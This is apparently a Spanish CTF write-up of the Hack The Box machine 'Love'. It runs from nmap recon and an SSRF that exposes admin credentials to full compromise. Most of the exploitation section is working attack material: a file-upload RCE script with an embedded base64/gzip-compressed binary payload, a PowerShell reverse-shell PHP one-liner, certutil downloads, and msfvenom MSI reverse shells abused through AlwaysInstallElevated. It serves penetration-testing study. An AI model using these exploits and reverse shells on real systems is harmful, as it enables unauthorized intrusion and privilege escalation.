-----
- Tags: #ssrf #fileupload #searchsploit #certutil #winpeas #hacktricks #msfvenom #msiexec
-----
# Resolución

## Reconocimiento

### NMAP

**Puertos**
```js
# Nmap 7.94SVN scan initiated Wed Nov 20 17:27:12 2024 as: nmap -p- --open --min-rate 5000 -vvv -n -Pn -oN allPorts 10.10.10.239
Nmap scan report for 10.10.10.239
Host is up, received user-set (0.57s latency).
Scanned at 2024-11-20 17:27:12 -03 for 21s
Not shown: 65372 closed tcp ports (reset), 144 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
443/tcp   open  https        syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
3306/tcp  open  mysql        syn-ack ttl 127
5000/tcp  open  upnp         syn-ack ttl 127
5040/tcp  open  unknown      syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
5986/tcp  open  wsmans       syn-ack ttl 127
7680/tcp  open  pando-pub    syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127
49670/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Nov 20 17:27:33 2024 -- 1 IP address (1 host up) scanned in 21.02 seconds
```

----

**Servicios**
```js
Nmap scan report for 10.10.10.239
Host is up (0.48s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: Voting System using PHP
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_http-title: 403 Forbidden
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, TLSSessionReq, WMSRequest, afp, giop: 
|_    Host '10.10.16.9' is not allowed to connect to this MariaDB server
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
|_ssl-date: 2024-11-20T20:56:49+00:00; +21m27s from scanner time.
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp  open  pando-pub?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.94SVN%I=7%D=11/20%Time=673E474D%P=x86_64-pc-linux-gnu%
SF:r(RTSPRequest,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.9'\x20is\x20no
SF:t\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RP
SF:CCheck,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.9'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(DNSStatus
SF:RequestTCP,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.9'\x20is\x20not\x
SF:20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TLSSe
SF:ssionReq,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.9'\x20is\x20not\x20
SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Kerbero
SF:s,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.9'\x20is\x20not\x20allowed
SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LDAPSearchReq,
SF:49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.9'\x20is\x20not\x20allowed\x
SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LDAPBindReq,49,"
SF:E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.9'\x20is\x20not\x20allowed\x20to
SF:\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SIPOptions,49,"E\0\0
SF:\x01\xffj\x04Host\x20'10\.10\.16\.9'\x20is\x20not\x20allowed\x20to\x20c
SF:onnect\x20to\x20this\x20MariaDB\x20server")%r(LANDesk-RC,49,"E\0\0\x01\
SF:xffj\x04Host\x20'10\.10\.16\.9'\x20is\x20not\x20allowed\x20to\x20connec
SF:t\x20to\x20this\x20MariaDB\x20server")%r(NCP,49,"E\0\0\x01\xffj\x04Host
SF:\x20'10\.10\.16\.9'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20t
SF:his\x20MariaDB\x20server")%r(NotesRPC,49,"E\0\0\x01\xffj\x04Host\x20'10
SF:\.10\.16\.9'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20
SF:MariaDB\x20server")%r(JavaRMI,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16
SF:\.9'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\
SF:x20server")%r(WMSRequest,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.9'\
SF:x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20se
SF:rver")%r(afp,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.9'\x20is\x20not
SF:\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(gio
SF:p,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.9'\x20is\x20not\x20allowed
SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h21m30s, deviation: 4h00m07s, median: 21m26s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-11-20T12:56:31-08:00
| smb2-time: 
|   date: 2024-11-20T20:56:29
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov 20 17:35:25 2024 -- 1 IP address (1 host up) scanned in 208.55 seconds
```

- Se detectó en el *puerto 80* un **Panel de** **Login** en el cual no es posible inyectar ningún tipo de ataque (SQLI, NOSQLI, etc).
- Se detectó en el escaneo de servicios con ``nmap`` que se está aplicando **Virtual Hosting** a la URL **``staging.love.htb``** por lo tanto se añadió a mi ``/etc/hosts`` al igual que **``love.htb``**.
- Se detectó a través del Virtual Hosting un panel de **análisis de archivos**. **``staging.love.htb``**

----
## Explotación

Se encontró una ruta ``/admin`` dentro del *puerto 80* que corresponde a otro **Panel de login** idéntico pero esta vez se solicita un usuario en vez de un ID (Cabe aclarar que a simple viste no se detectaron vulnerabilidades).

![[Love 2.png]]

----
### SSRF

Se detectó en el panel de análisis de archivos de **``staging.love.htb``** un **SSRF** ya que podemos tramitar un análisis a la *``127.0.0.1``* que corresponde a la máquina **Love**. Esto se debe a que es la máquina **Love** misma la que visita la *``127.0.0.1``*.
Gracias lo anterior podemos realizar un **Port Discovery** extenso o en su defecto revisar puertos que como usuario externo no tenía acceso, este es el caso del *puerto 5000*.

![[Love 1.png]]

Al obtener las credenciales ``admin:@LoveIsInTheAir!!!!`` procedemos a autenticarnos en **``http://love.htb/admin/``** con las mismas.

---
### Utilización de ``searchsploit``

Se realizó una búsqueda en la herramienta para detectar posibles métodos para efectuar un **RCE** al estar autenticado.

- ``searchsploit voting system``

![[Love 3.png]]

- ``searchsploit -m php/webapps/49445.py`` para descargar el script.

Modifico el código para que sea accesible a mis datos (url, usuario, contraseña, ip, etc).

```php
# Exploit Title: Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)
# Date: 19/01/2021
# Exploit Author: Richard Jones
# Vendor Homepage:https://www.sourcecodester.com/php/12306/voting-system-using-php.html
# Software Link: https://www.sourcecodester.com/download-code?nid=12306&title=Voting+System+using+PHP%2FMySQLi+with+Source+Code
# Version: 1.0
# Tested on: Windows 10 2004 + XAMPP 7.4.4

import requests

# --- Edit your settings here ----
IP = "love.htb" # Website's URL
USERNAME = "admin" #Auth username
PASSWORD = "@LoveIsInTheAir!!!!" # Auth Password
REV_IP = "10.10.16.9" # Reverse shell IP
REV_PORT = "443" # Reverse port
# --------------------------------

INDEX_PAGE = f"http://{IP}/admin/index.php"
LOGIN_URL = f"http://{IP}/admin/login.php"
VOTE_URL = f"http://{IP}/admin/voters_add.php"
CALL_SHELL = f"http://{IP}/images/shell.php"

payload = """

<?php

header('Content-type: text/plain');
$ip   = "IIPP";
$port = "PPOORRTT";
$payload = "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";
$evalCode = gzinflate(base64_decode($payload));
$evalArguments = " ".$port." ".$ip;
$tmpdir ="C:\\windows\\temp";
chdir($tmpdir);
$res .= "Using dir : ".$tmpdir;
$filename = "D3fa1t_shell.exe";
$file = fopen($filename, 'wb');
fwrite($file, $evalCode);
fclose($file);
$path = $filename;
$cmd = $path.$evalArguments;
$res .= "\n\nExecuting : ".$cmd."\n";
echo $res;
$output = system($cmd);

?>
"""
payload = payload.replace("IIPP", REV_IP)
payload = payload.replace("PPOORRTT", REV_PORT)

burp = {'http': 'http://127.0.0.1:8080'}

s = requests.Session()
s.proxies = burp

def getCookies():
    r = s.get(INDEX_PAGE)
    return r.cookies

def login():
    cookies = getCookies()
    data = {
        "username":USERNAME,
        "password":PASSWORD,
        "login":""
    }
    r = s.post(LOGIN_URL, data=data, cookies=cookies)
    if r.status_code == 200:
        print("Logged in")
        return True
    else:
        return False

def sendPayload():
    if login():
        global payload
        payload = bytes(payload, encoding="UTF-8")
        files  = {'photo':('shell.php',payload,
                    'image/png', {'Content-Disposition': 'form-data'}
                  )
              }
        data = {
            "firstname":"a",
            "lastname":"b",
            "password":"1",
            "add":""
        }
        r = s.post(VOTE_URL, data=data, files=files)
        if r.status_code == 200:
            print("Poc sent successfully")
        else:
            print("Error")

def callShell():
    r = s.get(CALL_SHELL, verify=False)
    if r.status_code == 200:
        print("Shell called check your listiner")
print("Start a NC listner on the port you choose above and run...")
sendPayload()
callShell()
```

Cabe destacar que añadí una variable *``burp = {'http': 'http://127.0.0.1:8080'}``* antes de la request, y luego se agregó otra variable *``s.proxies = burp``* luego de la request, esto lo hice para poder ver como el script envía las peticiónes a través de **``Burpsuite``** en el ``HTTP History`` de la herramienta. 
De esta forma ante cualquier error del script me voy a enterar si es un error proveniente de las **requests** ya que puedo leer los **códigos de estado** de estas.

![[Love 4.png]]

Todo salió correctamente ya que **modifiqué bien** el script para que se ajuste a mi caso. ==Utilizar ``rlwrap nc -nlvp 443`` para poder manipular cómodamente la consola interactiva==.

![[Love 5.png]]

----

Un método alternativo sería **subir de forma manual un archivo** con extensión **php** a través de la sección "**``Voters``**", una vez autenticados como **admin**. Todo esto es posible gracias a que no se aplica sanitización con respecto a las extensiones de los archivos que suben en el campo de imagen de usuario.

Dentro del archivo **php** irá el siguiente código el cual su función es entablar una Reverse Shell a través de Powershell.

```php
<?php
system("powershell -c \"\$client = New-Object System.Net.Sockets.TCPClient('TU_IP',PUERTO); \$stream = \$client.GetStream(); [byte[]] \$bytes = 0..65535|%{0}; while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){; \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i); \$sendback = (iex \$data 2>&1 | Out-String ); \$sendback2  = \$sendback + 'PS ' + (pwd).Path + '> '; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush()}; \$client.Close()\"");
?>
```

Se debe reemplazar en el campo "**``TU_IP``**" y "**``PUERTO``**" los datos correspondientes, de esta forma simplemente colocándome en escucha en mi máquina de atacante, al abrir la foto ganaré acceso a la máquina.

De estas dos formas **ganamos acceso** a la máquina Windows **Love**.
## Escalada de Privilegios

### User Flag

Una vez gané acceso a la máquina me desplazo al directorio ``C:\Users\Phoebe\Desktop>`` para ver el contenido de la **primer flag** ubicada en el archivo ``user.txt``

- ``type user.txt``

----
### Root Flag

#### Utilización de la herramienta **``Winpeas``**

Para comenzar la escalada de privilegios hacia el usuario root me voy a ayudar de la herramienta **``winPEAS``** que se puede descargar a través de su [repositorio](https://github.com/peass-ng/PEASS-ng/releases/tag/20241101-6f46e855), esta herramienta sirve para **realizar reconocimiento en una máquina Windows** de forma automática. El binario que debemos descargarnos se llama ``winPEASx64.exe``.

Montamos un servidor con ``python3 -m http.server 80`` en la ruta donde tengamos el **``winPEAS``** y en la máquina víctima ejecutamos lo siguiente.

- ``certutil.exe -f -urlcache -split http://10.10.16.9/winPEASx64.exe``

El comando **``certutil.exe``** es nativo de Windows y es originalmente para gestionar certificados, sin embargo los atacantes lo usan para descargar archivos también con la ventaja de que es un comando presente en todas las versiones del Sistema operativo, inclusive XP, tiene funcionalidad de descargar archivos como si de un ``curl`` o ``wget`` se tratase, puede evitar algunas soluciones de seguridad.

Luego lo ejecuté de la siguiente forma.

- ``winPEASx64.exe``

Una vez ejecutado veremos en una de sus secciones la siguiente cadena.

- **``Checking AlwaysInstallElevated set to 1 HKLM y HKCU``**

A continuación nos brinda un enlace de [Hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated), este tipo de vulnerabilidad es crítica ya que **fácilmente podemos ganar acceso al usuario administrador**. En este caso utilizaremos el segundo Payload otorgado por la web en la sección de "*``Metasploit Payloads``*", este sirve para crear un usuario con privilegios elevados, en mi caso no quiero hacer eso, simplemente quiero conectarme a través de una **Reverse Shell** a la máquina pero esta vez como usuario administrador, por lo tanto lo voy a modificar.

**Sin modificar**
- ``msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi``

**Modificado**
- ``msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.9 LPORT=443 --platform -windows -a x64 -f msi -o reverse.msi``

Este archivo ``reverse.msi`` lo vamos a subir a la máquina víctima de la misma forma que lo hicimos previamente.

Ahora en la sección *``MSI installation``* de Hacktricks utilizamos el Payload brindado para **instalar nuestro binario malicioso**.

- ``msiexec /quiet /qn /i reverse.msi``

Lo único que quedaría por hacer es ponernos en escucha con **``rlwrap nc -nlvp 443``** y ejecutar el binario con el **comando anterior**, de esta forma **ganaremos acceso a la máquina** pero como usuario *authorized*.

![[Love 6.png]]